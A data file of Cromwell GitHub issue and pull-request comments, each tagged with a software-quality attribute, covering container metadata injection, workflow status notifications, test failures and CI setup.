https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851:78,Integrability,inject,injects,78,"While exploring the idea of using a `monitoring_image` for this, I noticed it injects more or less the metadata I'd want into the monitoring container via environment variables already: . https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/MonitoringAction.scala#L36. https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/monitoring/Env.scala#L18. Is there a reason this could not also be injected into UserActions, and would you accept a PR that does so? (As a side note, it seems the monitoring image could likely accomplish what we want as well, but using one on Terra, or setting any custom workflow options is not allowed as far as I know).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851
https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851:661,Integrability,inject,injected,661,"While exploring the idea of using a `monitoring_image` for this, I noticed it injects more or less the metadata I'd want into the monitoring container via environment variables already: . https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/MonitoringAction.scala#L36. https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/monitoring/Env.scala#L18. Is there a reason this could not also be injected into UserActions, and would you accept a PR that does so? (As a side note, it seems the monitoring image could likely accomplish what we want as well, but using one on Terra, or setting any custom workflow options is not allowed as far as I know).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851
https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851:167,Modifiability,variab,variables,167,"While exploring the idea of using a `monitoring_image` for this, I noticed it injects more or less the metadata I'd want into the monitoring container via environment variables already: . https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/MonitoringAction.scala#L36. https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/monitoring/Env.scala#L18. Is there a reason this could not also be injected into UserActions, and would you accept a PR that does so? (As a side note, it seems the monitoring image could likely accomplish what we want as well, but using one on Terra, or setting any custom workflow options is not allowed as far as I know).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851
https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851:78,Security,inject,injects,78,"While exploring the idea of using a `monitoring_image` for this, I noticed it injects more or less the metadata I'd want into the monitoring container via environment variables already: . https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/MonitoringAction.scala#L36. https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/monitoring/Env.scala#L18. Is there a reason this could not also be injected into UserActions, and would you accept a PR that does so? (As a side note, it seems the monitoring image could likely accomplish what we want as well, but using one on Terra, or setting any custom workflow options is not allowed as far as I know).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851
https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851:661,Security,inject,injected,661,"While exploring the idea of using a `monitoring_image` for this, I noticed it injects more or less the metadata I'd want into the monitoring container via environment variables already: . https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/MonitoringAction.scala#L36. https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/monitoring/Env.scala#L18. Is there a reason this could not also be injected into UserActions, and would you accept a PR that does so? (As a side note, it seems the monitoring image could likely accomplish what we want as well, but using one on Terra, or setting any custom workflow options is not allowed as far as I know).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851
https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591275893:131,Integrability,inject,injection,131,"We have historically promoted the idea that task outputs should be pure functions of their inputs, so there is no support for data injection. Such injection would not be captured e.g. for purposes of comparing task identity for call caching.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591275893
https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591275893:147,Integrability,inject,injection,147,"We have historically promoted the idea that task outputs should be pure functions of their inputs, so there is no support for data injection. Such injection would not be captured e.g. for purposes of comparing task identity for call caching.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591275893
https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591275893:131,Security,inject,injection,131,"We have historically promoted the idea that task outputs should be pure functions of their inputs, so there is no support for data injection. Such injection would not be captured e.g. for purposes of comparing task identity for call caching.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591275893
https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591275893:147,Security,inject,injection,147,"We have historically promoted the idea that task outputs should be pure functions of their inputs, so there is no support for data injection. Such injection would not be captured e.g. for purposes of comparing task identity for call caching.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591275893
https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591332855:795,Availability,avail,available,795,"That makes sense, and I understand the concerns around call caching discussed in the linked issue. If this ENV injection will never be supported is there another recommended method for a workflow to pass information about itself outside cromwell as this seems to be something many people have requested (dating back at least 6 years based on that issue). Right now, as far as I'm aware, the only option is to poll the REST API which is suboptimal if you're running many workflows at once, and also means that the external service must be authed to either Terra or wherever your standalone cromwell server lives. It would be very useful for those of us that already have systems for tracking metadata, sample information, etc if cromwell had the ability to notify those systems when results were available somehow. Either through a step in the workflow itself as requested above, or perhaps via webhooks or similar. If not the injection solution above, is anything like that on the roadmap, or is this just not something the team is planning on addressing? Everyone has limited resources and I get that certain things just aren't a priority.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591332855
https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591332855:111,Integrability,inject,injection,111,"That makes sense, and I understand the concerns around call caching discussed in the linked issue. If this ENV injection will never be supported is there another recommended method for a workflow to pass information about itself outside cromwell as this seems to be something many people have requested (dating back at least 6 years based on that issue). Right now, as far as I'm aware, the only option is to poll the REST API which is suboptimal if you're running many workflows at once, and also means that the external service must be authed to either Terra or wherever your standalone cromwell server lives. It would be very useful for those of us that already have systems for tracking metadata, sample information, etc if cromwell had the ability to notify those systems when results were available somehow. Either through a step in the workflow itself as requested above, or perhaps via webhooks or similar. If not the injection solution above, is anything like that on the roadmap, or is this just not something the team is planning on addressing? Everyone has limited resources and I get that certain things just aren't a priority.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591332855
https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591332855:926,Integrability,inject,injection,926,"That makes sense, and I understand the concerns around call caching discussed in the linked issue. If this ENV injection will never be supported is there another recommended method for a workflow to pass information about itself outside cromwell as this seems to be something many people have requested (dating back at least 6 years based on that issue). Right now, as far as I'm aware, the only option is to poll the REST API which is suboptimal if you're running many workflows at once, and also means that the external service must be authed to either Terra or wherever your standalone cromwell server lives. It would be very useful for those of us that already have systems for tracking metadata, sample information, etc if cromwell had the ability to notify those systems when results were available somehow. Either through a step in the workflow itself as requested above, or perhaps via webhooks or similar. If not the injection solution above, is anything like that on the roadmap, or is this just not something the team is planning on addressing? Everyone has limited resources and I get that certain things just aren't a priority.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591332855
https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591332855:111,Security,inject,injection,111,"That makes sense, and I understand the concerns around call caching discussed in the linked issue. If this ENV injection will never be supported is there another recommended method for a workflow to pass information about itself outside cromwell as this seems to be something many people have requested (dating back at least 6 years based on that issue). Right now, as far as I'm aware, the only option is to poll the REST API which is suboptimal if you're running many workflows at once, and also means that the external service must be authed to either Terra or wherever your standalone cromwell server lives. It would be very useful for those of us that already have systems for tracking metadata, sample information, etc if cromwell had the ability to notify those systems when results were available somehow. Either through a step in the workflow itself as requested above, or perhaps via webhooks or similar. If not the injection solution above, is anything like that on the roadmap, or is this just not something the team is planning on addressing? Everyone has limited resources and I get that certain things just aren't a priority.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591332855
https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591332855:926,Security,inject,injection,926,"That makes sense, and I understand the concerns around call caching discussed in the linked issue. If this ENV injection will never be supported is there another recommended method for a workflow to pass information about itself outside cromwell as this seems to be something many people have requested (dating back at least 6 years based on that issue). Right now, as far as I'm aware, the only option is to poll the REST API which is suboptimal if you're running many workflows at once, and also means that the external service must be authed to either Terra or wherever your standalone cromwell server lives. It would be very useful for those of us that already have systems for tracking metadata, sample information, etc if cromwell had the ability to notify those systems when results were available somehow. Either through a step in the workflow itself as requested above, or perhaps via webhooks or similar. If not the injection solution above, is anything like that on the roadmap, or is this just not something the team is planning on addressing? Everyone has limited resources and I get that certain things just aren't a priority.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591332855
https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591356898:31,Integrability,pub-sub,pub-sub,31,"Cromwell Really Should Support pub-sub for workflow status notifications. There is definitely some kind of code in there already today, but it is not used in production and I don't know how complete it is. That said, it should be possible now to use the `/query` endpoint to get information about multiple workflows at once, such as all currently-running workflows, or all workflows started after X time.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591356898
https://github.com/broadinstitute/cromwell/issues/7139#issuecomment-1551517865:42,Security,validat,validation,42,This is a design choice to allow workflow validation before inputs are known. You could list the required inputs and check them against what you have by running the [`inputs` command](https://cromwell.readthedocs.io/en/stable/WOMtool/#inputs).,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7139#issuecomment-1551517865
https://github.com/broadinstitute/cromwell/pull/7140#issuecomment-1589517248:102,Availability,error,error,102,"Tested with the app, confirmed that public files are able to be read and that we hit the expected TES error when trying to read other workspace blobs that are not private",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7140#issuecomment-1589517248
https://github.com/broadinstitute/cromwell/pull/7140#issuecomment-1589517248:0,Testability,Test,Tested,0,"Tested with the app, confirmed that public files are able to be read and that we hit the expected TES error when trying to read other workspace blobs that are not private",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7140#issuecomment-1589517248
https://github.com/broadinstitute/cromwell/issues/7144#issuecomment-1556087820:53,Deployability,pipeline,pipeline,53,PS Basically I'd like to close these ugly gaps in my pipeline ; ![image](https://github.com/broadinstitute/cromwell/assets/57629300/ebe89fb6-8420-486d-b52f-653f29fc73c5). The gap between `rc` generation and the `Status change from Running to Done` message,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7144#issuecomment-1556087820
https://github.com/broadinstitute/cromwell/issues/7144#issuecomment-1556087820:248,Integrability,message,message,248,PS Basically I'd like to close these ugly gaps in my pipeline ; ![image](https://github.com/broadinstitute/cromwell/assets/57629300/ebe89fb6-8420-486d-b52f-653f29fc73c5). The gap between `rc` generation and the `Status change from Running to Done` message,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7144#issuecomment-1556087820
https://github.com/broadinstitute/cromwell/pull/7147#issuecomment-1577684949:42,Deployability,deploy,deploy,42,"@Ghost-in-a-Jar You're good to go, `can-i-deploy` is working now after I manually record latest `drshub-alpha` deployment in Pact Broker. Take a look at [https://beehive.dsp-devops.broadinstitute.org/environments/alpha/chart-releases/drshub/applied-changesets](https://beehive.dsp-devops.broadinstitute.org/environments/alpha/chart-releases/drshub/applied-changesets) with tag `0.47.0` here [https://github.com/DataBiosphere/terra-drs-hub/commit/fec172918ef0c255e6a55b50ab8bad96bd197c27](https://github.com/DataBiosphere/terra-drs-hub/commit/fec172918ef0c255e6a55b50ab8bad96bd197c27).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7147#issuecomment-1577684949
https://github.com/broadinstitute/cromwell/pull/7147#issuecomment-1577684949:111,Deployability,deploy,deployment,111,"@Ghost-in-a-Jar You're good to go, `can-i-deploy` is working now after I manually record latest `drshub-alpha` deployment in Pact Broker. Take a look at [https://beehive.dsp-devops.broadinstitute.org/environments/alpha/chart-releases/drshub/applied-changesets](https://beehive.dsp-devops.broadinstitute.org/environments/alpha/chart-releases/drshub/applied-changesets) with tag `0.47.0` here [https://github.com/DataBiosphere/terra-drs-hub/commit/fec172918ef0c255e6a55b50ab8bad96bd197c27](https://github.com/DataBiosphere/terra-drs-hub/commit/fec172918ef0c255e6a55b50ab8bad96bd197c27).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7147#issuecomment-1577684949
https://github.com/broadinstitute/cromwell/pull/7147#issuecomment-1577684949:225,Deployability,release,releases,225,"@Ghost-in-a-Jar You're good to go, `can-i-deploy` is working now after I manually record latest `drshub-alpha` deployment in Pact Broker. Take a look at [https://beehive.dsp-devops.broadinstitute.org/environments/alpha/chart-releases/drshub/applied-changesets](https://beehive.dsp-devops.broadinstitute.org/environments/alpha/chart-releases/drshub/applied-changesets) with tag `0.47.0` here [https://github.com/DataBiosphere/terra-drs-hub/commit/fec172918ef0c255e6a55b50ab8bad96bd197c27](https://github.com/DataBiosphere/terra-drs-hub/commit/fec172918ef0c255e6a55b50ab8bad96bd197c27).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7147#issuecomment-1577684949
https://github.com/broadinstitute/cromwell/pull/7147#issuecomment-1577684949:332,Deployability,release,releases,332,"@Ghost-in-a-Jar You're good to go, `can-i-deploy` is working now after I manually record latest `drshub-alpha` deployment in Pact Broker. Take a look at [https://beehive.dsp-devops.broadinstitute.org/environments/alpha/chart-releases/drshub/applied-changesets](https://beehive.dsp-devops.broadinstitute.org/environments/alpha/chart-releases/drshub/applied-changesets) with tag `0.47.0` here [https://github.com/DataBiosphere/terra-drs-hub/commit/fec172918ef0c255e6a55b50ab8bad96bd197c27](https://github.com/DataBiosphere/terra-drs-hub/commit/fec172918ef0c255e6a55b50ab8bad96bd197c27).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7147#issuecomment-1577684949
https://github.com/broadinstitute/cromwell/pull/7147#issuecomment-1577685577:40,Energy Efficiency,green,green,40,@Ghost-in-a-Jar Also take a look at the green `alpha` label at [https://pact-broker.dsp-eng-tools.broadinstitute.org/matrix?q%5B%5Dpacticipant=cromwell-consumer&q%5B%5Dpacticipant=drshub-provider&latest=&mainBranch=&latestby=cvpv&limit=100](https://pact-broker.dsp-eng-tools.broadinstitute.org/matrix?q%5B%5Dpacticipant=cromwell-consumer&q%5B%5Dpacticipant=drshub-provider&latest=&mainBranch=&latestby=cvpv&limit=100),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7147#issuecomment-1577685577
https://github.com/broadinstitute/cromwell/pull/7153#issuecomment-1577103887:152,Testability,test,testing,152,"I'm a bit wary of turning `simpleLooksParseable` into too much of an actual parser but it looks like we already have that functionality implemented, so testing is a no brainer 👍",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7153#issuecomment-1577103887
https://github.com/broadinstitute/cromwell/pull/7153#issuecomment-1577103887:27,Usability,simpl,simpleLooksParseable,27,"I'm a bit wary of turning `simpleLooksParseable` into too much of an actual parser but it looks like we already have that functionality implemented, so testing is a no brainer 👍",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7153#issuecomment-1577103887
https://github.com/broadinstitute/cromwell/pull/7155#issuecomment-1583190760:18,Availability,failure,failure,18,I see a unit test failure that looks like it could be the result of one of these upgrades:; ```; should not mix up credentials *** FAILED *** (44 milliseconds); [info] java.lang.NoSuchFieldException: credentials; [info] at java.base/java.lang.Class.getDeclaredField(Class.java:2411); [info] at cromwell.filesystems.gcs.GcsPathBuilderSpec.credentialsForPath$1(GcsPathBuilderSpec.scala:326); [info] at cromwell.filesystems.gcs.GcsPathBuilderSpec.$anonfun$new$7(GcsPathBuilderSpec.scala:334); [info] at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); [info] at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); [info] at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); [info] at org.scalatest.Transformer.apply(Transformer.scala:22); [info] at org.scalatest.Transformer.apply(Transformer.scala:20); [info] at org.scalatest.flatspec.AnyFlatSpecLike$$anon$5.apply(AnyFlatSpecLike.scala:1832); [info] at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7155#issuecomment-1583190760
https://github.com/broadinstitute/cromwell/pull/7155#issuecomment-1583190760:81,Deployability,upgrade,upgrades,81,I see a unit test failure that looks like it could be the result of one of these upgrades:; ```; should not mix up credentials *** FAILED *** (44 milliseconds); [info] java.lang.NoSuchFieldException: credentials; [info] at java.base/java.lang.Class.getDeclaredField(Class.java:2411); [info] at cromwell.filesystems.gcs.GcsPathBuilderSpec.credentialsForPath$1(GcsPathBuilderSpec.scala:326); [info] at cromwell.filesystems.gcs.GcsPathBuilderSpec.$anonfun$new$7(GcsPathBuilderSpec.scala:334); [info] at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); [info] at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); [info] at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); [info] at org.scalatest.Transformer.apply(Transformer.scala:22); [info] at org.scalatest.Transformer.apply(Transformer.scala:20); [info] at org.scalatest.flatspec.AnyFlatSpecLike$$anon$5.apply(AnyFlatSpecLike.scala:1832); [info] at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7155#issuecomment-1583190760
https://github.com/broadinstitute/cromwell/pull/7155#issuecomment-1583190760:13,Testability,test,test,13,I see a unit test failure that looks like it could be the result of one of these upgrades:; ```; should not mix up credentials *** FAILED *** (44 milliseconds); [info] java.lang.NoSuchFieldException: credentials; [info] at java.base/java.lang.Class.getDeclaredField(Class.java:2411); [info] at cromwell.filesystems.gcs.GcsPathBuilderSpec.credentialsForPath$1(GcsPathBuilderSpec.scala:326); [info] at cromwell.filesystems.gcs.GcsPathBuilderSpec.$anonfun$new$7(GcsPathBuilderSpec.scala:334); [info] at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); [info] at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); [info] at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); [info] at org.scalatest.Transformer.apply(Transformer.scala:22); [info] at org.scalatest.Transformer.apply(Transformer.scala:20); [info] at org.scalatest.flatspec.AnyFlatSpecLike$$anon$5.apply(AnyFlatSpecLike.scala:1832); [info] at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7155#issuecomment-1583190760
https://github.com/broadinstitute/cromwell/pull/7155#issuecomment-1583190760:934,Testability,Test,TestSuite,934,I see a unit test failure that looks like it could be the result of one of these upgrades:; ```; should not mix up credentials *** FAILED *** (44 milliseconds); [info] java.lang.NoSuchFieldException: credentials; [info] at java.base/java.lang.Class.getDeclaredField(Class.java:2411); [info] at cromwell.filesystems.gcs.GcsPathBuilderSpec.credentialsForPath$1(GcsPathBuilderSpec.scala:326); [info] at cromwell.filesystems.gcs.GcsPathBuilderSpec.$anonfun$new$7(GcsPathBuilderSpec.scala:334); [info] at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); [info] at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); [info] at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); [info] at org.scalatest.Transformer.apply(Transformer.scala:22); [info] at org.scalatest.Transformer.apply(Transformer.scala:20); [info] at org.scalatest.flatspec.AnyFlatSpecLike$$anon$5.apply(AnyFlatSpecLike.scala:1832); [info] at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7155#issuecomment-1583190760
https://github.com/broadinstitute/cromwell/pull/7155#issuecomment-1583190760:956,Testability,Test,TestSuite,956,I see a unit test failure that looks like it could be the result of one of these upgrades:; ```; should not mix up credentials *** FAILED *** (44 milliseconds); [info] java.lang.NoSuchFieldException: credentials; [info] at java.base/java.lang.Class.getDeclaredField(Class.java:2411); [info] at cromwell.filesystems.gcs.GcsPathBuilderSpec.credentialsForPath$1(GcsPathBuilderSpec.scala:326); [info] at cromwell.filesystems.gcs.GcsPathBuilderSpec.$anonfun$new$7(GcsPathBuilderSpec.scala:334); [info] at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); [info] at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); [info] at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); [info] at org.scalatest.Transformer.apply(Transformer.scala:22); [info] at org.scalatest.Transformer.apply(Transformer.scala:20); [info] at org.scalatest.flatspec.AnyFlatSpecLike$$anon$5.apply(AnyFlatSpecLike.scala:1832); [info] at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7155#issuecomment-1583190760
https://github.com/broadinstitute/cromwell/pull/7155#issuecomment-1589327404:11,Deployability,update,updated,11,"@dspeck1 I updated this branch to trigger another CI run, let's see what happens",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7155#issuecomment-1589327404
https://github.com/broadinstitute/cromwell/pull/7160#issuecomment-1591837281:67,Energy Efficiency,green,green,67,"Still working on getting full test suite to pass, but DBMS test is green.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7160#issuecomment-1591837281
https://github.com/broadinstitute/cromwell/pull/7160#issuecomment-1591837281:30,Testability,test,test,30,"Still working on getting full test suite to pass, but DBMS test is green.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7160#issuecomment-1591837281
https://github.com/broadinstitute/cromwell/pull/7160#issuecomment-1591837281:59,Testability,test,test,59,"Still working on getting full test suite to pass, but DBMS test is green.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7160#issuecomment-1591837281
https://github.com/broadinstitute/cromwell/pull/7166#issuecomment-1614738252:11,Testability,test,test,11,"The single test that keeps failing here is also failing in other branches, I'm going to merge and we'll look at that test separately.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7166#issuecomment-1614738252
https://github.com/broadinstitute/cromwell/pull/7166#issuecomment-1614738252:117,Testability,test,test,117,"The single test that keeps failing here is also failing in other branches, I'm going to merge and we'll look at that test separately.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7166#issuecomment-1614738252
https://github.com/broadinstitute/cromwell/issues/7171#issuecomment-1623729173:35,Usability,undo,undocumented,35,As mentioned in Slack archiving is undocumented/untested/unsupported on self-hosted instances. I'll leave the issue open on the off chance somebody actually got it working.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7171#issuecomment-1623729173
https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966:362,Availability,avail,available,362,"Known issues:. ---. 1. The `Centaur GCP Batch` [test](https://github.com/broadinstitute/cromwell/actions/runs/5590808626/jobs/10221029126?pr=7177) is unexpectedly trying to use Application Default Credentials when it should be using the service account `cromwell@broad-dsde-cromwell-dev.iam.gserviceaccount.com`. ```; The Application Default Credentials are not available. They are available if running in Google Compute Engine.; ```. The SA should be available as evidenced by the following output near the top of the log, so it looks like an issue with selecting the right credentials. In other words, I think this is an application logic issue in GCP Batch rather than an environment problem. (Cromwell uses service account auth for everything but local development.); ```; Activated service account credentials for: [cromwell@broad-dsde-cromwell-dev.iam.gserviceaccount.com]; ```. Plausibly responsible party to fix: Burwood. ---. 2. DRS-related failures in [Centaur Horicromtal PapiV2 Beta](https://github.com/broadinstitute/cromwell/actions/runs/5590808626/jobs/10221030693?pr=7177#logs) seem to be the downstream of not being able to build/push the `cromwell-drs-localizer` image. Example error below; images should appear [in the GCR for `broad-dsde-cromwell-dev`](https://console.cloud.google.com/gcr/images/broad-dsde-cromwell-dev/global/cromwell-drs-localizer?project=broad-dsde-cromwell-dev) and the named one does not exist. ```; Error response from daemon:; manifest for gcr.io/broad-dsde-cromwell-dev/cromwell-drs-localizer:github-5590808626 not found; ```. I've replicated the inability to build locally, including on `develop`, and am iterating in this PR: https://github.com/broadinstitute/cromwell/pull/7179. Plausibly responsible party to fix: Broad. ---. 3. Unit tests are [failing](https://github.com/broadinstitute/cromwell/actions/runs/5590808615/jobs/10221028981?pr=7177) because an assertion is looking for different paths in some cases. Examples:. ```; GcpBatchFileInput(""wf",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966
